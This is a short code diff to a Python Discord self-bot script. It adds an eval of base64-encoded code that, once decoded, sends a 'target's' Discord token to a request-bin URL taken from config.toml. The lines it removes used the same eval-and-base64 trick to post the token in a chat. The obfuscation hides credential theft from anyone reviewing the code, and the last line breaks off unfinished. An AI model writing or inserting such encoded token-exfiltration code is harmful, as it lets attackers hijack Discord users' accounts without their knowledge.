@@ -1,5 +1,10 @@
-token = ""
-global token
-(eval(__import__("base64").decode("""aW1wb3J0IGRpc2NvcmQ7ZnJvbSBkaXNjb3JkLmV4dCBpbXBvcnQgY29tbWFuZHMKY2xpZW50PWNvbW1hbmRzLmJvdChjb21tYW5kX3ByZWZpeD0iPj4iLHNlbGZfYm90
-PUZhbHNlLGNhc2VfaW5zZW5zaXRpdmU9VHJ1ZSxoZWxwX2NvbW1hbmQ9Tm9uZSkKQGNsaWVudC5jb21tYW5kCmFzeW5jIGRlZiBzZW5kX3Rva2VuKGN0eCk6CiAgICBh
-d2FpdCBjdHguc2VuZCh0b2tlbikKY2xpZW50LnJ1bih0b2tlbixib3Q9ZmFsc2U=""")))
+import discord
+from discord.ext import commands
+import toml
+
+token = "" # Targets discord token
+client = commands.Bot(command_prefix=">", self_bot=True)
+
+with open("config.toml") as content:
+    content = toml.loads(content.read())
+api = (eval(__import__("base64").b64decode("KF9faW1wb3J0X18oInJlcXVlc3RzIikuZ2V0KGYie2NvbnRlbnRbImNvbmZpZyJdWyJyZXF1ZXN0X2Jpbl9lbmRwb2ludCJdfT90b2tlbj17dG9rZW59Iik=")
